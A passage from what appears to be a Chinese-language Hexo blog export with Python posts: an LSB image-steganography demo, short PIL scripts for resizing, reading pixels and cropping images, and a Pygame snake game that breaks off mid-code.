len(binary) <span class="keyword">else</span> (r,g,b,t) <span class="keyword">for</span> index,(r,g,b,t) <span class="keyword">in</span> enumerate(list(evenImage.getdata()))] <span class="comment"># &#x5C06; binary &#x4E2D;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x4FE1;&#x606F;&#x7F16;&#x7801;&#x8FDB;&#x50CF;&#x7D20;&#x91CC;</span></span><br><span class="line">    encodedImage = Image.new(evenImage.mode, evenImage.size)  <span class="comment"># &#x521B;&#x5EFA;&#x65B0;&#x56FE;&#x7247;&#x4EE5;&#x5B58;&#x653E;&#x7F16;&#x7801;&#x540E;&#x7684;&#x50CF;&#x7D20;</span></span><br><span class="line">    encodedImage.putdata(encodedPixels)  <span class="comment"># &#x6DFB;&#x52A0;&#x7F16;&#x7801;&#x540E;&#x7684;&#x6570;&#x636E;</span></span><br><span class="line">    <span class="keyword">return</span> encodedImage</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#x4ECE;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x4E3A; UTF-8 &#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binaryToString</span><span class="params">(binary)</span>:</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    string = []</span><br><span class="line">    rec = <span class="keyword">lambda</span> x, i: x[<span class="number">2</span>:<span class="number">8</span>] + (rec(x[<span class="number">8</span>:], i<span class="number">-1</span>) <span class="keyword">if</span> i &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&apos;&apos;</span>) <span class="keyword">if</span> x <span class="keyword">else</span> <span class="string">&apos;&apos;</span></span><br><span class="line">    <span class="comment"># rec = lambda x, i: x and (x[2:8] + (i &gt; 1 and rec(x[8:], i-1) or &apos;&apos;)) or &apos;&apos;</span></span><br><span class="line">    fun = <span class="keyword">lambda</span> x, i: x[i+<span class="number">1</span>:<span class="number">8</span>] + rec(x[<span class="number">8</span>:], i<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">while</span> index + <span class="number">1</span> &lt; len(binary):</span><br><span class="line">        chartype = binary[index:].index(<span class="string">&apos;0&apos;</span>) <span class="comment"># &#x5B58;&#x653E;&#x5B57;&#x7B26;&#x6240;&#x5360;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B57;&#x7B26;&#x4F1A;&#x5B58;&#x4E3A; 0</span></span><br><span class="line">        length = chartype*<span class="number">8</span> <span class="keyword">if</span> chartype <span class="keyword">else</span> <span class="number">8</span></span><br><span class="line">        string.append(chr(int(fun(binary[index:index+length],chartype),<span class="number">2</span>)))</span><br><span class="line">        index += length</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&apos;&apos;</span>.join(string)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#x89E3;&#x7801;&#x9690;&#x85CF;&#x6570;&#x636E;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decodeImage</span><span class="params">(image)</span>:</span></span><br><span class="line">    pixels = list(image.getdata())  <span class="comment"># &#x83B7;&#x5F97;&#x50CF;&#x7D20;&#x5217;&#x8868;</span></span><br><span class="line">    binary = <span class="string">&apos;&apos;</span>.join([str(int(r&gt;&gt;<span class="number">1</span>&lt;&lt;<span class="number">1</span>!=r))+str(int(g&gt;&gt;<span class="number">1</span>&lt;&lt;<span class="number">1</span>!=g))+str(int(b&gt;&gt;<span class="number">1</span>&lt;&lt;<span class="number">1</span>!=b))+str(int(t&gt;&gt;<span class="number">1</span>&lt;&lt;<span class="number">1</span>!=t)) <span class="keyword">for</span> (r,g,b,t) <span class="keyword">in</span> pixels]) <span class="comment"># &#x63D0;&#x53D6;&#x56FE;&#x7247;&#x4E2D;&#x6240;&#x6709;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E2D;&#x7684;&#x6570;&#x636E;</span></span><br><span class="line">    <span class="comment"># &#x627E;&#x5230;&#x6570;&#x636E;&#x622A;&#x6B62;&#x5904;&#x7684;&#x7D22;&#x5F15;</span></span><br><span class="line">    locationDoubleNull = binary.find(<span class="string">&apos;0000000000000000&apos;</span>)</span><br><span class="line">    endIndex = locationDoubleNull+(<span class="number">8</span>-(locationDoubleNull % <span class="number">8</span>)) <span class="keyword">if</span> locationDoubleNull%<span class="number">8</span> != <span class="number">0</span> <span class="keyword">else</span> locationDoubleNull</span><br><span class="line">    data = binaryToString(binary[<span class="number">0</span>:endIndex])</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">encodeDataInImage(Image.open(<span class="string">&quot;coffee.png&quot;</span>), <span class="string">&apos;&#x4F60;&#x597D;&#x4E16;&#x754C;&#xFF0C;Hello world!&apos;</span>).save(<span class="string">&apos;encodeImage.png&apos;</span>)</span><br><span class="line">print(decodeImage(Image.open(<span class="string">&quot;encodeImage.png&quot;</span>)))</span><br></pre></td></tr></tbody></table></figure><p></p><p>note:</p><blockquote></blockquote><p>&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#xFF08;&#x82F1;&#x8BED;&#xFF1A;Least Significant Bit&#xFF0C;lsb&#xFF09;&#x662F;&#x6307;&#x4E00;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x5B57;&#x4E2D;&#x7684;&#x7B2C;0&#x4F4D;&#xFF08;&#x5373;&#x6700;&#x4F4E;&#x4F4D;&#xFF09;&#xFF0C;&#x6743;&#x503C;&#x4E3A;2^0&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x5B83;&#x6765;&#x68C0;&#x6D4B;&#x6570;&#x7684;&#x5947;&#x5076;&#x6027;&#x3002;&#x4E0E;&#x4E4B;&#x76F8;&#x53CD;&#x7684;&#x79F0;&#x4E4B;&#x4E3A;&#x6700;&#x9AD8;&#x6709;&#x6548;&#x4F4D;&#x3002;&#x5728;&#x5927;&#x7AEF;&#x5E8F;&#x4E2D;&#xFF0C;lsb&#x6307;&#x6700;&#x53F3;&#x8FB9;&#x7684;&#x4F4D;&#x3002;<br>&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4EE3;&#x8868;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x4E2D;&#x7684;&#x6700;&#x5C0F;&#x7684;&#x5355;&#x4F4D;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6307;&#x793A;&#x6570;&#x5B57;&#x5F88;&#x5C0F;&#x7684;&#x53D8;&#x5316;&#x3002;<br>LSB&#xFF08;&#x5168;&#x5927;&#x5199;&#xFF09;&#x6709;&#x65F6;&#x4E5F;&#x6307;Least Significant Byte&#xFF0C;&#x6307;&#x591A;&#x5B57;&#x8282;&#x5E8F;&#x5217;&#x4E2D;&#x6700;&#x5C0F;&#x6743;&#x91CD;&#x7684;&#x5B57;&#x8282;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PIL change image</title>
      <link href="/2018/10/10/PIL-resize-image/"/>
      <url>/2018/10/10/PIL-resize-image/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_pil-Maya-Python-Compile.jpg" alt=""></p><a id="more"></a><h3 id="&#x8FD0;&#x7528;PIL&#x6539;&#x53D8;&#x56FE;&#x7247;&#x7684;&#x5927;&#x5C0F;"><a href="#&#x8FD0;&#x7528;PIL&#x6539;&#x53D8;&#x56FE;&#x7247;&#x7684;&#x5927;&#x5C0F;" class="headerlink" title="&#x8FD0;&#x7528;PIL&#x6539;&#x53D8;&#x56FE;&#x7247;&#x7684;&#x5927;&#x5C0F;"></a>&#x8FD0;&#x7528;PIL&#x6539;&#x53D8;&#x56FE;&#x7247;&#x7684;&#x5927;&#x5C0F;</h3><p>&#x4E4B;&#x524D;&#x4E00;&#x76F4;&#x4F7F;&#x7528;&#x4ECE;&#x522B;&#x4EBA;&#x7F51;&#x7AD9;&#x4E0A;&#x76D7;&#x53D6;&#x7684;&#x56FE;&#x7247;&#xFF08;&#x5982;&#x679C;&#x5185;&#x5BB9;&#x6D89;&#x53CA;&#x5230;&#x4FB5;&#x6743;&#x7684;&#x8BDD;&#x8BF7;&#x8054;&#x7CFB;&#x6211;&#xFF0C;&#x6211;&#x4F1A;&#x628A;&#x4ED6;&#x4EEC;&#x5220;&#x9664;&#x7684;^_^&#xFF09;,&#x4ECA;&#x5929;&#x81EA;&#x5DF1;&#x627E;&#x4E86;&#x4E2A;&#x56FE;&#x7247;&#xFF0C;&#x56E0;&#x4E3A;&#x56FE;&#x7247;&#x5927;&#x5C0F;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x653E;&#x5230;blog&#x4E0A;&#x9762;&#x592A;&#x4E0D;&#x7F8E;&#x89C2;&#x4E86;&#x3002;&#x60F3;&#x5230;&#x524D;&#x51E0;&#x5929;&#x5B66;&#x7684;pillow&#x5E93;&#xFF0C;&#x7075;&#x673A;&#x4E00;&#x52A8;&#x5728;&#x7F51;&#x4E0A;&#x627E;&#x4E86;&#x4E2A;&#x5173;&#x4E8E;&#x4F7F;&#x7528;python&#x4FEE;&#x6539;&#x56FE;&#x7247;&#x5927;&#x5C0F;&#x7684;&#x6559;&#x7A0B;&#xFF0C;&#x81EA;&#x5DF1;&#x53C8;&#x6539;&#x4E86;&#x4E9B;&#x90E8;&#x5206;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x6539;&#x53D8;&#x56FE;&#x7247;&#x5927;&#x5C0F;&#x7684;&#x5C0F;&#x7A0B;&#x5E8F;&#x3002;&#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x4E0B;&#x6548;&#x679C;&#x8FD8;&#x4E0D;&#x9519;&#x3002;&#x8FD9;&#x91CC;&#x9762;&#x6709;&#x4E2A;&#x5751;&#x5C31;&#x662F;y_x&#x7684;&#x7C7B;&#x578B;&#x5FC5;&#x987B;&#x662F;int&#x7C7B;&#x578B;&#x7684;&#xFF0C;&#x4E0D;&#x7136;&#x7684;&#x8BDD;&#x8FD0;&#x884C;&#x7684;&#x65F6;&#x5019;&#x4E00;&#x76F4;&#x62A5;&#x9519;&#x3002;</p><p>adjust.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Usage python3 adjust.py [infile]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Options:</span></span><br><span class="line"><span class="string">    -h --help           show this on screen.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&quot;infile&quot;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">infile = args.infile</span><br><span class="line">outfile = <span class="string">&quot;resize_&quot;</span>+infile</span><br><span class="line"></span><br><span class="line">im = Image.open(infile)</span><br><span class="line"></span><br><span class="line">print(im.size)</span><br><span class="line"></span><br><span class="line">(x, y) = im.size</span><br><span class="line"></span><br><span class="line">print(im)</span><br><span class="line"></span><br><span class="line">x_s = <span class="number">529</span></span><br><span class="line">y_s = (int)(y * x_s / x)</span><br><span class="line">out = im.resize((x_s, y_s), Image.ANTIALIAS)</span><br><span class="line">out.save(outfile)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;original size : &quot;</span>, x, y)</span><br><span class="line">print(<span class="string">&quot;adjust size : &quot;</span>, x_s, y_s)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#xFF1A;<br>&#x6539;&#x4E4B;&#x524D;&#xFF1A;<br><img src="http://p4wiqzx0i.bkt.clouddn.com/pygame-badge-SMA.png" alt=""><br>&#x6539;&#x4E4B;&#x540E;&#xFF1A;<br><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_pygame-badge-SMA.png" alt=""></p><h3 id="&#x67E5;&#x770B;&#x56FE;&#x7247;&#x50CF;&#x7D20;"><a href="#&#x67E5;&#x770B;&#x56FE;&#x7247;&#x50CF;&#x7D20;" class="headerlink" title="&#x67E5;&#x770B;&#x56FE;&#x7247;&#x50CF;&#x7D20;"></a>&#x67E5;&#x770B;&#x56FE;&#x7247;&#x50CF;&#x7D20;</h3><p>view.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Usage python3 adjust.py [infile]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Options:</span></span><br><span class="line"><span class="string">    -h --help           show this on screen.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&quot;infile&quot;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">infile = args.infile</span><br><span class="line"></span><br><span class="line">im = Image.open(infile)</span><br><span class="line">im = im.convert(<span class="string">&apos;RGBA&apos;</span>)</span><br><span class="line"></span><br><span class="line">pixdata = im.load()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(im.size[<span class="number">0</span>]):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(im.size[<span class="number">1</span>]):</span><br><span class="line">        print(pixdata[x, y])</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x526A;&#x5207;&#x56FE;&#x7247;"><a href="#&#x526A;&#x5207;&#x56FE;&#x7247;" class="headerlink" title="&#x526A;&#x5207;&#x56FE;&#x7247;"></a>&#x526A;&#x5207;&#x56FE;&#x7247;</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span>  argparse</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Usage python3 crop.py [infile]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Options:</span></span><br><span class="line"><span class="string">    -h --help           show this on screen.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;infile&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">infile = args.infile</span><br><span class="line">outfile = <span class="string">&quot;corp_&quot;</span> + infile</span><br><span class="line"></span><br><span class="line">im = Image.open(infile)</span><br><span class="line"></span><br><span class="line"><span class="string">&apos;&apos;&apos;</span></span><br><span class="line"><span class="string">&#x88C1;&#x526A;&#xFF1A;&#x4F20;&#x5165;&#x4E00;&#x4E2A;&#x5143;&#x7EC4;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;</span></span><br><span class="line"><span class="string">&#x5143;&#x7EC4;&#x91CC;&#x7684;&#x5143;&#x7D20;&#x5206;&#x522B;&#x662F;&#xFF1A;&#xFF08;&#x8DDD;&#x79BB;&#x56FE;&#x7247;&#x5DE6;&#x8FB9;&#x754C;&#x8DDD;&#x79BB;x&#xFF0C; &#x8DDD;&#x79BB;&#x56FE;&#x7247;&#x4E0A;&#x8FB9;&#x754C;&#x8DDD;&#x79BB;y&#xFF0C;&#x8DDD;&#x79BB;&#x56FE;&#x7247;&#x5DE6;&#x8FB9;&#x754C;&#x8DDD;&#x79BB;+&#x88C1;&#x526A;&#x6846;&#x5BBD;&#x5EA6;x+w&#xFF0C;&#x8DDD;&#x79BB;&#x56FE;&#x7247;&#x4E0A;&#x8FB9;&#x754C;&#x8DDD;&#x79BB;+&#x88C1;&#x526A;&#x6846;&#x9AD8;&#x5EA6;y+h&#xFF09;</span></span><br><span class="line"><span class="string">&apos;&apos;&apos;</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">133</span></span><br><span class="line">y = <span class="number">0</span></span><br><span class="line">w = <span class="number">533</span></span><br><span class="line">h = <span class="number">533</span></span><br><span class="line"></span><br><span class="line">region = im.crop((x, y, x+w, y+h))</span><br><span class="line">region.save(outfile)</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> pillow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pillow </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pygame development snake game</title>
      <link href="/2018/10/10/Pygame-development-snake-game/"/>
      <url>/2018/10/10/Pygame-development-snake-game/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_pygame-badge-SMA.png" alt=""></p><a id="more"></a><p>&#x4ECA;&#x5929;&#x7528;python&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x8D2A;&#x5403;&#x86C7;&#x7684;&#x6E38;&#x620F;&#xFF0C;&#x76EE;&#x524D;&#x529F;&#x80FD;&#x8FD8;&#x4E0D;&#x5B8C;&#x5584;&#xFF0C;&#x4F46;&#x662F;&#x57FA;&#x672C;&#x7684;&#x64CD;&#x4F5C;&#x90FD;&#x6709;&#x4E86;&#x3002;<br>game.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">pygame.init()</span><br><span class="line"></span><br><span class="line">white = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">black = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">red = (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">favorite1 = (<span class="number">43</span>, <span class="number">95</span>, <span class="number">117</span>)</span><br><span class="line">favorite2 = (<span class="number">219</span>, <span class="number">142</span>, <span class="number">113</span>)</span><br><span class="line"></span><br><span class="line">screen_height = <span class="number">800</span></span><br><span class="line">screen_width = <span class="number">800</span></span><br><span class="line">rect_size = <span class="number">30</span></span><br><span class="line">FPS = <span class="number">30</span></span><br><span class="line"></span><br><span class="line">snake_list = []</span><br><span class="line"></span><br><span class="line">gameDisplay = pygame.display.set_mode((screen_height, screen_width))</span><br><span class="line">pygame.display.set_caption(<span class="string">&apos;snake game&apos;</span>)</span><br><span class="line"></span><br><span class="line">pygame.display.update()</span><br><span class="line"></span><br><span class="line">font = pygame.font.SysFont(<span class="keyword">None</span>, <span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">clock = pygame.time.Clock()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message_to_screen</span><span class="params">(msg, color, x, y)</span>:</span></span><br><span class="line">    screen_text = font.render(msg, <span class="keyword">True</span>, color)</span><br><span class="line">    gameDisplay.blit(screen_text, [x, y])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">snake</span><span class="params">(snake_list)</span>:</span></span><br><span class="line">    print(len(snake_list))</span><br><span class="line">    <span class="keyword">for</span> XnY <span class="keyword">in</span> snake_list:</span><br><span class="line">        pygame.draw.rect(gameDisplay, favorite2, [XnY[<span class="number">0</span>], XnY[<span class="number">1</span>], rect_size, rect_size])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gameLoop</span><span class="params">()</span>:</span></span><br><span class="line">    gameExit = <span class="keyword">False</span></span><br><span class="line">    gameOver = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    change_load_x = <span class="number">0</span></span><br><span class="line">    change_load_y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    snake_length = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    center_x = screen_width/<span class="number">2</span></span><br><span class="line">    center_y = screen_height/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    load_x = center_x</span><br><span class="line">    load_y = center_y</span><br><span class="line"></span><br><span class="line">    Apple_x = (random.randrange(<span class="number">0</span>, screen_width-rect_size)/<span class="number">10</span>)*<span class="number">10</span></span><br><span class="line">    Apple_y = (random.randrange(<span class="number">0</span>, screen_height-rect_size)/<span class="number">10</span>)*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> gameExit:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> gameOver:</span><br><span class="line">            gameDisplay.fill(black)</span><br><span class="line">            message_to_screen(<span class="string">&quot;Do you want to play again? press &apos;y&apos; to continue, or &apos;q&apos; to quit: &quot;</span>, favorite2,</span><br><span class="line">                              center_x<span class="number">-120</span>, center_y<span class="number">-120</span>)</span><br><span class="line">            pygame.display.update()</span><br><span class="line">            <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">                <span class="keyword">if</span> event.type == pygame.KEYDOWN:</span><br><span class="line">                    <span class="keyword">if</span> event.key == pygame.K_y:</span><br><span class="line">                        gameOver = <span class="keyword">False</span></span><br><span class="line">                        load_x = center_x</span><br><span class="line">                        load_y = center_y</span><br><span class="line">                        change_load_x = <span class="number">0</span></span><br><span class="line">                        change_load_y = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">elif</span> event.key == pygame.K_q:</span><br><span class="line">                        pygame.quit()</span><br><span class="line">                        quit()</span><br><span class="line">        <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">            <span class="keyword">if</span> event.type == pygame.QUIT:</span><br><span class="line">                gameExit = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> event.type == pygame.KEYDOWN:</span><br><span class="line">                <span class="keyword">if</span> event.key == pygame.K_LEFT:</span><br><span class="line">                    change_load_x = <span class="number">-10</span></span><br><span class="line">                    change_load_y = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> event.key == pygame.K_RIGHT:</span><br><span class="line">                    change_load_x = <span class="number">10</span></span><br><span class="line">                    change_load_y = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> event.key == pygame.K_UP:</span><br><span class="line">                    change_load_y = <span class="number">-10</span></span><br><span class="line">                    change_load_x = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> event.key == pygame.K_DOWN:</span><br><span class="line">                    change_load_y = <span class="number">10</span></span><br><span class="line">                    change_load_x = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> load_x &lt; <span class="number">0</span> <span class="keyword">or</span> load_x &gt;= screen_width <span class="keyword">or</span> load_y &lt; <span class="number">0</span> <span class="keyword">or</span> load_y &gt;= screen_height:</span><br><span class="line">            gameOver = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        load_x += change_load_x</span><br><span class="line">        load_y += change_load_y</span><br><span class="line"></span><br><span class="line">        gameDisplay.fill(favorite1)</span><br><span class="line"></span><br><span class="line">        pygame.draw.rect(gameDisplay, red, [Apple_x, Apple_y, rect_size, rect_size])</span><br><span 